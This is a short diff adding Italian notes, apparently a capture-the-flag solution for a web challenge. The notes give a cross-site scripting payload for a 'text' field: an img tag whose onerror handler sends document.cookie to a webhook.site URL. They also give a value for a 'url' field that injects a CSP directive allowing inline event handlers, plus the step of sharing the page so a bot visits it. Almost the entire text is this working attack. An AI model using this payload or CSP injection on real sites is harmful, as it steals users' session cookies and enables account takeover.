@@ -1,0 +1,10 @@
+ho inserito questo nel campo text.
+
+"><img src="1" title="true" x:xx/onerror="location.href='https://webhook.site/53a58d73-5587-4ba4-a5b2-8575627334b4/?cookie=' + document.cookie">
+
+ho inserito questo nel campo url in modo da aggiungere un ulteriore direttiva all' header della csp
+
+; script-src-attr 'unsafe-inline'
+
+
+# poi clicchi pulsante share e il bot visita la pagina
